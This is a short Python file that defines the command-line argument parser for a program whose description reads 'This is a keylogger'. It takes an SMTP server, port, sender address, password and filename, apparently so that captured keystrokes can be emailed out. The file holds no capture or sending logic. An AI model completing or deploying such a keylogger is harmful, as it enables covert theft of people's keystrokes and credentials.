#!/bin/python3.8

import argparse

class Parser(object):

    @classmethod
    def parse_arguments(self) -> list:

        parser = argparse.ArgumentParser(
            add_help = True,
            description = "This is a keylogger"
        )

        parser.add_argument(
            "-s", "--server", action="store", type=str, required=True,
            help="Enter the domain of the server (smtp.gmail.com)."
        )

        parser.add_argument(
            "-p", "--port", action="store", type=int, required=True,
            help="Enter the port which you want to connect to the smtp server (587)."
        )

        parser.add_argument(
             "-e", "--sender", action="store", type=str, required=True,
            help="Enter your e-mail"
        )

        parser.add_argument(
            "-n", "--filename", action="store", type=str, required=True,
            help='Enter the name of the file'
        )

        parser.add_argument(
            "-a", "--passwordOfEmailAccount", action="store", type=str, required=True,
        )

        return_value = {}
        args = parser.parse_args()

        try:
            return_value["server"] = args.server
            return_value["port"] = args.port
            return_value["sender"] = args.sender
            return_value["filename"] = args.filename
            return_value["password"] = args.passwordOfEmailAccount

        except:
            parser.print_help()
            SystemExit

        return return_value
